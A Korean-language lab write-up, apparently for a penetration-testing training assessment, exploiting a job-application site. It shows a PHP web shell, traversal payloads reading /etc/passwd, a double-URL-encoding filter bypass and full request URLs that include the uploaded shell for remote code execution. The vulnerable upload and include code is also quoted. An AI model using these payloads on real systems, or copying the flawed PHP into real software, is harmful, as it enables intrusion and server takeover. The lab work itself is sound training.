---
title: "LFI - Skills Assessment"
date: 2026-06-13
layout: single
excerpt: "Sumace Consulting GmbH의 의뢰를 받아 메인 웹사이트에 대한 웹 애플리케이션 침투 테스트를 수행하게 되었다. 킥오프 미팅에서 CISO는 지난해 침투 테스트에서는 어떠한 취약점도 발견되지 않았지만, 이후 입사 지원서 기능이 새롭게 추가되었기 때문에 해당 기능을 중점적으로 살펴볼 필요가 있다고 언급했다."
author_profile: true
toc: true
toc_label: "LFI"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-web/lfi-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-web]
tags: [web, cpts, lfi]
---

# Scenario

Sumace Consulting GmbH의 의뢰를 받아 메인 웹사이트에 대한 웹 애플리케이션 침투 테스트를 수행하게 되었다. 

킥오프 미팅에서 CISO는 지난해 침투 테스트에서는 어떠한 취약점도 발견되지 않았지만, 이후 입사 지원서 기능이 새롭게 추가되었기 때문에 해당 기능을 중점적으로 살펴볼 필요가 있다고 언급했다.

## Web Enumeration

웹사이트에 접속하면 상단 메뉴에 `Home`, `Contact`, `Apply` 가 존재하는 것을 확인할 수 있다"

![LFI](/assets/cpts-web/lfi-skills-assessment/lfi1.png)

`Apply` 페이지로 이동하면 이름, 이메일, 추가 메모와 함께 이력서 파일을 첨부할 수 있는 입사 지원서 기능이 존재한다.

각 입력란에 테스트 값을 입력한 뒤 PHP 웹 셸이 포함된 `shell.php` 파일을 첨부해 제출하였다:

![LFI](/assets/cpts-web/lfi-skills-assessment/lfi2.png)

지원서를 제출하면 `thanks.php` 페이지로 리다이렉트되며, 지원서가 정상적으로 접수되었고 1~2 영업일 이내에 이메일로 연락하겠다는 안내 문구가 출력된다:

![LFI](/assets/cpts-web/lfi-skills-assessment/lfi3.png)

## Identifying the LFI Vulnerability

웹사이트를 살펴보던 중 이미지가 `/api/image.php` 엔드포인트의 `p` 파라미터를 통해 불러와지는 것을 확인하였다:

```html
<!-- SKIP -->

<figure>
    <img src="/api/image.php?p=9e3836574d40d60a56435829003f0196">
    <figcaption><i>12.08.2024. CEO William Moody presents <b>life-saving solutions</b> within <b>5 minutes</b> of being contacted by an <b>unspecified government</b>.</i></figcaption>
</figure>

<!-- SKIP -->
```

Burp Suite를 통해 해당 요청을 확인한 뒤, 중첩된 경로 탐색 문자열을 이용하여 `/etc/passwd` 파일을 요청하였다:

```text
....//....//....//....//etc/passwd
```

그 결과 `/etc/passwd` 의 내용이 HTTP 응답에 출력되었으며, `p` 파라미터에 **LFI 취약점이 존재함**을 확인할 수 있었다:

![LFI](/assets/cpts-web/lfi-skills-assessment/lfi4.png)

## Analyzing the File Upload Logic

앞서 확인한 입사 지원서의 파일 업로드 요청은 `/api/application.php` 에서 처리되고 있었다.

LFI 취약점을 이용하여 `application.php` 의 소스코드를 확인한 결과, 다음과 같은 파일 업로드 로직을 발견하였다:

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

먼저 다음 코드는 사용자가 업로드한 파일의 원래 파일명을 가져온다:

```php
$file_name = $_FILES["file"]["name"];
```

예를 들어 `shell.php` 파일을 업로드했다면 `$file_name` 변수에는 다음 값이 저장된다:

```text
shell.php
```
이후 파일명을 `.` 을 기준으로 분리하고, 마지막 값을 파일 확장자로 사용한다:

```php
$ext = end((explode(".", $file_name)));
```

따라서 `shell.php` 의 경우 `$ext` 변수에는 다음 값이 저장된다:

```text
php
```

업로드된 파일이 최종적으로 저장될 경로와 파일명은 다음 코드에서 생성된다:

```php
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
```

`md5_file($tmp_name)` 은 업로드된 파일의 내용 전체를 기준으로 MD5 해시값을 계산한다.

예를 들어 `shell.php` 파일의 내용이 다음과 같다고 가정한다:

```php
<?php system($_GET["cmd"]); ?>
```

실제로 업로드한 파일의 MD5 해시값은 다음 명령으로 계산할 수 있다:

```bash
$ md5sum shell.php

fc023fcacb27a7ad72d605c4e300b389
```

따라서 해당 파일은 서버에 다음 경로로 저장된다:

```text
uploads/fc023fcacb27a7ad72d605c4e300b389.php
```

계산한 MD5 해시값과 앞서 발견한 LFI 취약점을 이용하여 업로드된 파일의 경로를 요청한 결과 응답에서 업로드했던 PHP 웹 셸의 내용이 그대로 출력되는 것을 확인하였다:

![LFI](/assets/cpts-web/lfi-skills-assessment/lfi5.png)

## Discovering the Include Logic

`contact.php` 파일에서는 다음과 같은 파일 포함 로직을 확인할 수 있었다:

```php
<?php
$region = "AT";
$danger = false;

if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);
    }
}

if (!$danger) {
    include "./regions/" . $region . ".php";
}
?>
```

먼저 `region` 이라는 GET 파라미터가 존재하였고

이후 `region` 파라미터에 `.` 또는 `/` 문자가 포함되어 있는지 검사한다:

```php
if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
    echo "'region' parameter contains invalid character(s)";
    $danger = true;
}
```

만약 두 문자 중 하나라도 포함되어 있다면 다음 오류 메시지를 출력하고, `$danger` 값을 `true` 로 변경한다.

반대로 `.` 과 `/` 가 포함되어 있지 않다면 `else` 구문으로 이동하여 `urldecode()` 를 통해 `region` 값을 한 번 더 디코딩한다:

```php
else {
    $region = urldecode($_GET["region"]);
}
```

이후 `$danger` 값이 여전히 `false` 라면 다음과 같은 경로를 구성하여 PHP 파일을 `include` 한다:

```php
include "./regions/" . $region . ".php";
```

## Bypassing the Filter with Double Encoding

일반적인 `../` 는 당연히 차단된다. 

또한 `%2e%2e%2f` 처럼 한 번 URL 인코딩된 값을 보내더라도, PHP는 `$_GET` 값을 처리할 때 URL 디코딩을 한 번 수행하기 때문에 필터 검사 시점에는 `../` 로 보이게 되고 차단된다.

하지만 해당 애플리케이션은 필터 검사가 끝난 뒤 `urldecode()` 를 한 번 더 호출하고 있기 때문에 **Double Encoding을 이용한 우회**가 가능하다.

예를 들어 다음과 같이 이중 인코딩된 값을 전달한다:

```text
%252e%252e%252f
```

PHP가 쿼리 문자열을 처리하면서 한 번 디코딩하면 다음 값이 되어 필터를 통과한다:

```text
%2e%2e%2f
```

이후 `urldecode()` 가 다시 디코딩하면서 최종적으로 `../` 로 변환된다:

```text
../
```

## Exploiting the Include Vulnerability

먼저 Double Encoding을 이용하여 상위 디렉터리의 index.php 파일을 include할 수 있는지 확인하였다:

```text
http://154.57.164.74:30517/contact.php?region=%252e%252e%252findex
```

실제로 요청을 전송한 결과, `contact.php` 페이지 내부에 메인 페이지의 내용이 함께 출력되는 것을 확인할 수 있었다:

![LFI](/assets/cpts-web/lfi-skills-assessment/lfi6.png)

앞서 업로드한 `shell.php` 파일을 `include` 하기 위해 `region` 파라미터에 Double Encoding된 상대 경로를 전달하고, `cmd` 파라미터에는 실행할 시스템 명령을 지정하였다.

```text
http://154.57.164.74:30517/contact.php?region=%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=id
```

최종적으로 RCE를 획득할 수 있었다:

![LFI](/assets/cpts-web/lfi-skills-assessment/lfi7.png)

